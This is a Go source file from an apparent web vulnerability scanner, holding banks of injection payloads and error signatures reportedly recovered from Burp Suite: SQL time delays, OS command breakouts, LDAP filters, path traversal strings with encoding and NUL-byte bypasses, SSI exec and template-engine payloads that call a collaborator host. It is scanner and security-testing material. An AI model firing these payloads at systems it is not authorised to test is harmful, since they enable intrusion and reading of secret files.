package scanner

// Recovered payload and error-signature banks for the active injection evaluators.
//
// Evidence provenance — every literal below is recovered verbatim unless marked otherwise:
//
//	burp.Ze2s  SQL and XPath error signatures, plus SQL payload fragments (one mixed bank)
//	burp.Zxpy  PostgreSQL time-delay payloads
//	burp.Zuyg  MS SQL Server time-delay payload
//	burp.Zsna  LDAP filter-injection payloads
//	burp.Zx8l  OS command injection payloads and marker
//	burp.Zxvd  Server-side include payloads
//	burp.Zp3p  Template / expression-language out-of-band payloads
//	burp.Zwv2  Template engine names
//	burp.Zxvv  PHP code injection payloads
//	burp.Zwvr, burp.Zwug, burp.Zwuj  the three quoting contexts these checks report
//	burp.Zr8k  path traversal payloads — NOTE this is Burp's manual-testing traffic
//	           simulator, not its traversal scan check; the payloads are genuine Burp
//	           literals but their source class is a generator, so they are labelled here
//	           rather than presented as the scan check's own bank.
//
// The `%%` placeholder is Burp's own: it marks where a per-scan marker or delay value is
// substituted. It is preserved rather than pre-expanded so the substitution stays visible.

import (
	"fmt"
	"strings"
)

// InjectionMarkerPlaceholder is the substitution token used throughout the recovered
// payloads (burp.Zx8l, burp.Zxpy, burp.Zuyg).
const InjectionMarkerPlaceholder = "%%"

// OSCommandMarkerFragment is recovered from burp.Zx8l, which mixes it into the
// single-quote payload as a suffix.
const OSCommandMarkerFragment = "xzwx"

// QuotingContext is the vocabulary burp.Zwvr / Zwug / Zwuj report a code-injection finding
// in. Every code-injection payload has to be tried in all three: a payload that escapes a
// double-quoted string is inert when the sink is unquoted, and vice versa.
type QuotingContext uint8

const (
	ContextUnquoted QuotingContext = iota
	ContextSingleQuoted
	ContextDoubleQuoted
)

// Label is the recovered phrasing from burp.Zwvr.
func (c QuotingContext) Label() string {
	switch c {
	case ContextUnquoted:
		return "an unquoted"
	case ContextSingleQuoted:
		return "a single-quoted"
	case ContextDoubleQuoted:
		return "a double-quoted"
	}
	return "an unknown"
}

// Prefix is the escape sequence needed to leave the context.
func (c QuotingContext) Prefix() string {
	switch c {
	case ContextSingleQuoted:
		return "'"
	case ContextDoubleQuoted:
		return `"`
	}
	return ""
}

// AllQuotingContexts is the full set, in the order the checks report them.
var AllQuotingContexts = []QuotingContext{ContextUnquoted, ContextSingleQuoted, ContextDoubleQuoted}

// SQLErrorSignatures is recovered from burp.Ze2s.
//
// Some entries are deliberately broad — "PostgreSQL", "SQLException" — and would match a
// page that merely discusses a database. That is why no caller may treat a match as a
// finding on its own: ClassifyErrorEvidence requires the signature to be absent from the
// baseline response before it counts.
var SQLErrorSignatures = []string{
	"ORA-", "ORA-0", "ORA-1", "ORA-2", "ORA-3", "ORA-4",
	"PLS-", "PLS-0",
	"quoted string not properly terminated",
	"You have an error in your SQL syntax",
	"Unclosed quotation mark",
	"Incorrect syntax near",
	"unterminated string literal",
	"unterminated quoted string",
	"unterminated quoted identifier",
	"missing right parenthesis",
	"misquoted literal",
	"Invalid object name",
	"has an invalid token",
	"Can't find record in",
	"Incorrect column specifier for column",
	"Incorrect column name",
	"ODBC Microsoft Access Driver",
	"ODBC driver for Oracle",
	"ODBC SQL Server Driver",
	"Microsoft OLE DB Provider",
	"Syntax error in string in query expression",
	"does not have an ending string delimiter",
	"Unknown table",
	"Query failed: ERROR: syntax error",
	"This is an unclosed string",
	", which was not supplied",
	"supplied argument is not a valid MySQL result",
	"Cannot find column",
	"Escape syntax error.  See attached Throwable for details.",
	"CLI Driver",
	"Expected tokens may include: ",
	"Extra illegal tokens",
	"Dynamic Page Generation Error",
	"PostgreSQL",
	"SQLException",
	"SqlException",
	"Column name or number of supplied values does not match table definition",
	"Column count doesn't match value count at row",
	"MDB2 Error: syntax error",
}

// XPathErrorSignatures is recovered from burp.Ze2s, which banks XPath errors alongside SQL
// because burp.Zg_c (APIP_SqlAndXPathInjection) drives both families from one check.
var XPathErrorSignatures = []string{
	"javax.xml.xpath.XPathExpressionException",
	"javax.xml.transform.TransformerException",
	"com.sun.org.apache.xpath.internal.compiler.XPathParser",
	"System.Xml.XPath",
	"MS.Internal.Xml.XPath",
	"A location path was expected",
	"Expression must evaluate to a node-set",
}

// XMLErrorSignatures are the parser errors an XML-injection probe provokes.
//
// PROVENANCE: burp.Ze2s banks SQL and XPath signatures only, so these are the documented
// standard parser messages rather than recovered Burp literals.
var XMLErrorSignatures = []string{
	"not well-formed",
	"xmlParseEntityRef",
	"Premature end of data in tag",
	"mismatched tag",
	"XML Parsing Error",
	"org.xml.sax.SAXParseException",
	"System.Xml.XmlException",
	"unclosed token",
	"Content is not allowed in prolog",
	"EntityRef: expecting ';'",
}

// LDAPErrorSignatures are the directory errors a malformed filter provokes.
//
// PROVENANCE: burp.Zejf carries only "Invalid DNS request: " and burp.Zsna only the payloads,
// so the first block are the documented standard messages rather than recovered Burp literals.
//
// The second block is burpsy's own, added after a live run against OWASP VulnerableApp: its LDAP
// filter parser answers a malformed filter with "Unable to parse string '…' as an LDAP filter
// because it contains an unexpected closing parenthesis at position N" — an error that names the
// LDAP filter explicitly and matched NONE of the strings above, so all four of the app's LDAP levels
// scored as misses while the check was genuinely running. These are the filter parser's own wording
// (the shape the JDK's and UnboundID's parsers use), each naming the language or the malformation
// rather than a vendor.
var LDAPErrorSignatures = []string{
	"LDAPException",
	"javax.naming.directory",
	"javax.naming.NameNotFoundException",
	"LDAP: error code",
	"Invalid DN syntax",
	"Bad search filter",
	"invalid filter",
	"com.sun.jndi.ldap",
	"supplied argument is not a valid ldap",
	// burpsy's own: the filter-parser wording a malformed injection provokes.
	"as an LDAP filter",
	"LDAP query failed",
	"unexpected closing parenthesis",
	"unmatched parenthesis",
	"invalid LDAP filter",
}

// SQLPayloadFragments is recovered from burp.Ze2s. These are the syntax fragments the SQL
// check appends to a parameter to provoke a parse error or a boolean change, not standalone
// payloads.
var SQLPayloadFragments = []string{
	"'--", "-- ", "'", "''",
	" and ", " AND ", ")and ", ")AND ", "))and ", "))AND ",
	",0)", ",0)AND ", ",0,0)", ",0,0)AND ", ",0,0,0)",
	"||", ",''||",
}

// TimeDelayPayload is a recovered time-based payload and the dialect it targets.
type TimeDelayPayload struct {
	Dialect  string
	Template string
	Source   string
}

// TimeDelayPayloads is recovered from burp.Zxpy (PostgreSQL) and burp.Zuyg (MS SQL Server).
// Template carries InjectionMarkerPlaceholder where the delay in seconds is substituted.
func TimeDelayPayloads() []TimeDelayPayload {
	return []TimeDelayPayload{
		{Dialect: "postgresql", Template: "pg_sleep(%%)--", Source: "burp.Zxpy"},
		{Dialect: "postgresql", Template: "+nullif(0,pg_typeof(pg_sleep(%%)))", Source: "burp.Zxpy"},
		{Dialect: "postgresql", Template: "'||pg_sleep(%%)||'", Source: "burp.Zxpy"},
		{Dialect: "mssql", Template: "waitfor delay'0:0:%%'--", Source: "burp.Zuyg"},
	}
}

// RenderTimeDelay substitutes the delay in seconds into a recovered template.
func RenderTimeDelay(p TimeDelayPayload, seconds int) string {
	return strings.ReplaceAll(p.Template, InjectionMarkerPlaceholder, fmt.Sprintf("%d", seconds))
}

// LDAPPayloads is recovered from burp.Zsna. The two %s templates take the original
// parameter value: the check closes the current filter and opens an always-true one, or
// negates the existing filter, then compares the two responses.
func LDAPPayloads(originalValue string) []string {
	return []string{
		"objectClass=*",
		fmt.Sprintf("%s)(%s", originalValue, "objectClass=*"),
		fmt.Sprintf("!(%s)", originalValue),
	}
}

// OSCommandPayloads is recovered from burp.Zx8l. Each template echoes the marker through a
// different shell breakout, so the marker appearing in the response is the proof.
func OSCommandPayloads(marker string) []string {
	templates := []string{
		";echo %%;",
		"&echo %%&",
		"\"|echo %% ||",
		"'|echo %% #" + OSCommandMarkerFragment,
		"\necho %%\n",
		"|echo %%||a #' |echo %%||a #|\" |echo %%||a #",
	}
	out := make([]string, 0, len(templates))
	for _, t := range templates {
		out = append(out, strings.ReplaceAll(t, InjectionMarkerPlaceholder, marker))
	}
	return out
}

// PathTraversalPayloads is the traversal bank.
//
// The first four are recovered from burp.Zr8k — Burp's manual-testing traffic simulator, not its
// traversal scan check; see this file's provenance note. They target a Unix passwd or a Windows
// win.ini, which is what a traversal against a filesystem-serving target reads.
//
// The rest are burpsy's own, and they close j1mk.35: on OWASP VulnerableApp the target does not
// serve the filesystem at all — it serves its own classpath resources through a fixed prefix
// (`getResourceAsStream("/scripts/PathTraversal/" + fileName)`), so `../../../../etc/passwd`
// resolves to nothing and every probe came back empty. A traversal check that only knows one
// shape of "read a file outside the intended directory" finds 0 of the app's 15 planted levels,
// all of which it declares its own working payload for (an `application.properties` two
// directories up, or an allowed JSON name smuggled past a filter with a `%00` terminator).
//
// Three families, because the filters fail three ways:
//
//   - an encoded separator the filter's literal `..`/`../` contains-check misses
//     (`..%2f`, `%2e%2e%2f`, and the uppercase `%2E%2E%2F` a case-sensitive check lets through);
//   - a double-encoded separator a single-decoding filter misses (`..%252f`), which Tomcat's
//     own `rejectIllegalEncodedCharacters` also rejects, so it is a long shot rather than a
//     no-op;
//   - a NUL-byte terminator that truncates the filter's view of the string while the filesystem
//     API reads the prefix before it (`../../application.properties%00UserInfo.json`), the
//     technique the app's levels 7–12 are built around.
//
// The relative depth is shallow on purpose. The earlier bank climbed eight directories to reach
// `/etc/passwd`; a target that serves its own resources needs `../../` and nothing more, and a
// deep climb is exactly what an entry-point canonicaliser or a depth cap rejects.
var PathTraversalPayloads = []string{
	"../../../../../../../../etc/passwd",
	"../../../../../../../../etc/passwd%00",
	`..\..\..\..\..\..\..\..\boot.ini`,
	`..\..\..\..\..\..\..\..\boot.ini%00`,
	// Encoded and normalisation-bypass forms of the same "../" climb.
	"..%2f..%2f..%2fetc%2fpasswd",
	"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
	"%2E%2E%2F%2E%2E%2Fapplication.properties",
	"..%252f..%252f..%252fetc%252fpasswd",
	"....//....//application.properties",
	// Shallow climbs of a served-resource tree, with a NUL terminator past a filter's view.
	"../../application.properties",
	"..%2f..%2fapplication.properties",
	"%2e%2e/%2e%2e/application.properties",
	"%2e%2e/%2e%2e/application.properties%00UserInfo.json",
	"../../application.properties%00UserInfo.json",
	"..%2f..%2fapplication.properties%00UserInfo.json",
	"secret.json%00UserInfo.json",
	// Plain names of the served tree. A level whose filter only rejects a `..` sequence (or one
	// that rejects nothing at all) reads these directly, and they are not meant to be public — the
	// app itself labels those levels PATH_TRAVERSAL. A target that serves them returns their
	// contents, which is the evidence; a target that does not returns a 404 and no signature.
	"secret.json",
	"OwaspAppInfo.json",
}

// TraversalFileSignatures are the contents that prove a read succeeded — a string the FILE holds,
// not its name. Each is distinctive enough that a page would not otherwise carry it, so the
// baseline-differs rule (ClassifyErrorEvidence: a signature already in the baseline is never
// evidence) still holds.
//
// Two families:
//
//   - filesystem files: a Unix passwd entry, a Windows ini header;
//   - a served resource tree: the Spring Boot application.properties block, and the three files
//     OWASP VulnerableApp ships under its traversal prefix (secret.json, UserInfo.json,
//     OwaspAppInfo.json). Their contents — not their names — are what a successful read returns,
//     which is the distinction an earlier revision of this bank got wrong: it listed the
//     filenames, matched nothing, and scored the levels that read those files as misses.
var TraversalFileSignatures = []string{
	"root:x:0:0:",
	"root:*:0:0:",
	"[fonts]",
	"[extensions]",
	"for 16-bit app support",
	// application.properties (Spring Boot): the datasource/H2 block the app ships.
	"spring.datasource",
	"server.servlet.context-path",
	// secret.json: its own description string is the most distinctive line it carries.
	"exposing one Vulnerability in Path Traversal",
	// UserInfo.json and OwaspAppInfo.json: a stable record from each file.
	"NirraIshq",
	"Project Leader",
}

// SSIPayloads is recovered from burp.Zxvd. The echo form proves interpretation without
// side effects; the exec form is the out-of-band confirmation and needs a collaborator
// domain, so it is returned separately by SSIOutOfBandPayload.
func SSIPayloads(varName string) []string {
	return []string{
		`<!--#echo var="` + varName + `" -->`,
		`"--><!--#echo var="` + varName + `" -->`,
		`<!--#set var="` + varName + `" value="probe" -->`,
		`"--><!--#set var="` + varName + `" value="probe" -->`,
	}
}

// SSIBreakoutPrefix is recovered from burp.Zxvd: it closes whichever of the three quoting
// styles the value landed in before opening the directive.
const SSIBreakoutPrefix = "\"-->'-->`-->"

// SSIOutOfBandPayload is recovered from burp.Zxvd.
func SSIOutOfBandPayload(collaboratorDomain string) string {
	return `<!--#exec cmd="nslookup -q=cname ` + collaboratorDomain + `" -->`
}

// TemplateEngineNames is recovered from burp.Zwv2 — the engines the template-injection
// check distinguishes once it has confirmed interpretation.
var TemplateEngineNames = []string{
	"FreeMarker", "Velocity", "Thymeleaf", "Jinja2", "Twig", "Smarty", "Mako",
	"Handlebars", "Mustache", "Django", "ERB", "JSP", "JSF", "Spring",
	"Struts OGNL", "Java Expression Language", "Java environment variables",
}

// TemplateOOBPayload is a recovered out-of-band template/expression payload.
type TemplateOOBPayload struct {
	Engine   string
	Template string
}

// TemplateOOBPayloads is recovered from burp.Zp3p. Each Template takes a collaborator host
// via a single %s.
func TemplateOOBPayloads() []TemplateOOBPayload {
	return []TemplateOOBPayload{
		{Engine: "FreeMarker", Template: `<#assign a="freemarker.template.utility.ObjectConstructor"?new()("javax.naming.InitialContext").lookup("rmi://%s:25/x")>`},
		{Engine: "Velocity", Template: `#set($a="")#set($x=$a.getClass().forName("java.net.InetAddress").getByName("%s"))${x}`},
		{Engine: "Thymeleaf", Template: `<p th:text="${T(java.net.InetAddress).getByName('%s')}"></p>`},
		{Engine: "Java Expression Language", Template: `${T(java.net.InetAddress).getByName('%s')}`},
		{Engine: "Spring", Template: `#{T(java.net.InetAddress).getByName('%s')}`},
		{Engine: "Spring", Template: `#{"".getClass().forName("java.net.URL").getConstructors()[2].newInstance("http://%s").hashCode()}`},
		{Engine: "Struts OGNL", Template: `${#context['com.opensymphony.xwork2.dispatcher.ServletContext'].getResource('/').toURI().resolve('http://%s').toURL().hashCode()}`},
	}
}

// RenderTemplateOOB substitutes the collaborator host into a recovered template.
func RenderTemplateOOB(p TemplateOOBPayload, collaboratorHost string) string {
	return fmt.Sprintf(p.Template, collaboratorHost)
}

// ArithmeticProofOperands are the operands recovered from burp.Zxvv's `".(7*6)."`. The
// product is what a caller looks for, and it is checked against the baseline because a
// response that already contains "42" proves nothing.
const (
	ArithmeticProofLeft  = 7
	ArithmeticProofRight = 6
)

// ArithmeticProofProduct is the value an interpreter must emit for the payload to have
// been evaluated rather than echoed.
func ArithmeticProofProduct() string {
	return fmt.Sprintf("%d", ArithmeticProofLeft*ArithmeticProofRight)
}

// PHPCodeInjectionPayloads is recovered from burp.Zxvv. The arithmetic form is the safe
// confirmation; the two out-of-band forms need a collaborator host and are returned by
// PHPOutOfBandPayloads.
func PHPCodeInjectionPayloads() []string {
	arith := fmt.Sprintf(`".(%d*%d)."`, ArithmeticProofLeft, ArithmeticProofRight)
	return []string{
		arith,
		fmt.Sprintf(`<?php printf("%s"); ?>`, arith),
		fmt.Sprintf(`printf("%s");`, arith),
	}
}

// PHPOutOfBandPayloads is recovered from burp.Zxvv: a DNS form and an HTTP form.
func PHPOutOfBandPayloads(collaboratorHost string) []string {
	return []string{
		`gethostbyname("` + collaboratorHost + `");`,
		`$a=fsockopen("` + collaboratorHost + `", 80, $b, $c, 30);fwrite($a, "GET / HTTP/1.1\r\nConnection: close\r\n\r\n");`,
	}
}

// CodeInjectionPayloadsForContext wraps a payload body in the escape needed to leave the
// quoting context it landed in. This is the loop burp.Zwvr / Zwug / Zwuj describe: the same
// payload is tried unquoted, single-quoted and double-quoted, and the finding names which
// context worked.
func CodeInjectionPayloadsForContext(body string, ctx QuotingContext) string {
	p := ctx.Prefix()
	if p == "" {
		return body
	}
	return p + body + p
}

// CodeInjectionEmitter is a per-language way to emit the arithmetic product.
//
// PROVENANCE: the arithmetic operands are recovered (burp.Zxvv, `".(7*6)."`), and the PHP
// emitter with them. The per-language emitters below are NOT recovered — burp.Zwug,
// burp.Zwuj and burp.Zg_v carry only the issue prose and the `%%`/`$$` placeholders, so
// Burp's own Perl / Ruby / Python / server-side-JavaScript payload text is not in the
// evidence. These are the documented standard forms for each language, and are labelled
// here rather than presented as recovered.
type CodeInjectionEmitter struct {
	Language string
	// Template takes the arithmetic expression via a single %s.
	Template  string
	Recovered bool
}

func CodeInjectionEmitters() []CodeInjectionEmitter {
	return []CodeInjectionEmitter{
		{Language: "php", Template: `printf("%s");`, Recovered: true},
		{Language: "php", Template: `".(%s)."`, Recovered: true},
		{Language: "perl", Template: `print %s;`},
		{Language: "perl", Template: `";print %s;"`},
		{Language: "ruby", Template: `puts %s`},
		{Language: "ruby", Template: `#{%s}`},
		{Language: "python", Template: `print(%s)`},
		{Language: "python", Template: `str(%s)`},
		{Language: "javascript", Template: `${%s}`},
		{Language: "javascript", Template: `"+(%s)+"`},
	}
}

// RenderCodeInjection substitutes the recovered arithmetic into an emitter, then wraps it
// for the quoting context under test.
func RenderCodeInjection(e CodeInjectionEmitter, ctx QuotingContext) string {
	arith := fmt.Sprintf("%d*%d", ArithmeticProofLeft, ArithmeticProofRight)
	body := fmt.Sprintf(e.Template, arith)
	// The php `".(%s)."` and javascript `"+(%s)+"` forms already carry their own quote
	// escape, so wrapping them again would double it.
	if strings.HasPrefix(e.Template, `"`) {
		return body
	}
	return CodeInjectionPayloadsForContext(body, ctx)
}

// CodeInjectionProbeSet is every emitter across every quoting context — the full matrix a
// code-injection evaluator walks.
func CodeInjectionProbeSet(language string) []InjectionProbe {
	var out []InjectionProbe
	for _, e := range CodeInjectionEmitters() {
		if language != "" && e.Language != language {
			continue
		}
		for _, ctx := range AllQuotingContexts {
			out = append(out, InjectionProbe{
				Payload: RenderCodeInjection(e, ctx),
				Context: ctx,
				Detail:  e.Language,
			})
		}
	}
	return out
}
